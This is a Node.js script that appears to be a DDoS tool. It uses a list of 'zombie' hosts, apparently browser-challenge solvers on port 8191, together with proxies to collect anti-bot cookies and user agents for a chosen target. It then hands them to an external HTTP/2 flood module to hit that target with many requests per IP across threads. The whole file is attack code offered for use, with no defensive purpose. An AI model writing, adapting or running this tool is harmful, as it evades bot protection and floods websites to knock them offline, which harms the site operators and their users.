///Browser
///
/// Usage: node browser.js [Target] [Time] [Host List] [Proxy List] [Request Per IP] [Threads] [Delay] [Number Of Browsers]
const request = require('request');
const fs = require('fs');

function send(zombieIP, proxyIP, targetIP, callback) {
    var options = {
	timeout: 80000,
        uri: 'http://' + zombieIP + '/v1',
        headers: {
            "content-type": "application/json"
        },
        method: 'POST',
        json: { "cmd": "request.get", "url": ""+targetIP+"", proxy: {"url": `http://${proxyIP}`}, "maxTimeout": 120000 }
    };

    request(options, function (error, response, body) {
        if (!error && response.statusCode == 200 && body) {
            var status = body.status;

            if (status == "ok") {
                if (body.solution.cookies !== undefined) {
                    let cokFor = body.solution.cookies;
                    const userAgentRemote = body.solution.userAgent;
                    let cookieTotal = "";
                
                    cokFor.forEach((value) => {
                        const valueString = value.name + "=" + value.value + ";";
                        cookieTotal += valueString;
                    });
                    callback(cookieTotal+"|||||"+userAgentRemote)
                }else{
                    return 0
                }
            } else {
                return 0
            }
        } else {
            return 0
        }
    });
}
function sendFlood(host, time, reqperip, thread, successCookie){
    require("./ga.js").flooderHTTP2(
        (option = {
            host: host,
            time: time,
            reqsperip: reqperip,
            thread: thread,
            successCookie: successCookie,
        })
    );
    console.log("[Flooder started] "+proxy+"=>"+host+", Seconds: "+time);
}

const args = {
    host: process.argv[2],
    time: process.argv[3],
    zombieList: process.argv[4],
    proxyList: process.argv[5],
    reqperip: process.argv[6],
    thread: process.argv[7],
    delay: process.argv[8],
    browserCount: process.argv[9],
  };

  
var zombieTXT = fs.readFileSync(args.zombieList, 'utf-8').split(/\r?\n/);
var proxyTXT = fs.readFileSync(args.proxyList, 'utf-8').split(/\r?\n/);


var say = 0;
var sayCount = args.browserCount;
let count;
var successCookie = [];
var started = 0;

count = setInterval(function () {
    var zombie = zombieTXT[Math.floor(Math.random() * zombieTXT.length)];
    var proxy = proxyTXT[Math.floor(Math.random() * proxyTXT.length)];

    send(zombie, proxy, args.host, function (results) {
        if (results != 0) {
            if(say<=sayCount){

                var totalTarget = proxy+"!!!"+results;
                successCookie.push(totalTarget);

                sendFlood(args.host, args.time, args.reqperip, args.thread, successCookie);
                console.log("["+say+"] Browser Success Cookie")
                say++;
            }else{
                started++;
                clearInterval(count)
            }
        }else{
            console.log("[DIE] "+zombie+":8191")
        }
    });

}, args.delay);